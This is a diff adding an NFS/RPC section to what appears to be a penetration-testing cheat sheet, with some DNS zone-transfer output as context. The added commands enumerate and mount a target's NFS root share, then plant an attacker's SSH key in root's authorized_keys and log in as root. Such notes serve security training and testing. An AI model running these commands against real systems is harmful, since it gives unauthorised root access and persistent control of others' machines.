@@ -90,6 +90,31 @@ vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
 friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
 ```
 
+__Remote Procedure Call - RPC (111)__
+
+Exploit NFS shares
+```
+$ rpcinfo -p [ target IP ] | grep 'nfs'
+$ showmount -e [ target IP ]                      # show mountable directories
+$ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
+$ df -k                                           # show mounted file systems
+```
+
+Attack scenario: replace target SSH keys with your own
+```
+$ mkdir -p /root/.ssh
+$ cd /root/.ssh/
+$ ssh-keygen -t rsa -b 4096
+Enter file in which to save the key (/root/.ssh/id_rsa): hacker_rsa
+Enter passphrase (empty for no passphrase): Just Press Enter
+Enter same passphrase again: Just Press Enter
+$ mount -t nfs 192.168.1.112:/ /mnt -o nolock
+$ cd /mnt/root/.ssh
+$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/              # replace remote public key with your own
+$ cat hacker_rsa.pub >> authorized_keys                     # add your public key to authorized_keys
+$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using private keys
+```
+
 __SMB / NETBIOS / SMBD (135-139 - 445)__
 
 SMB enumeration
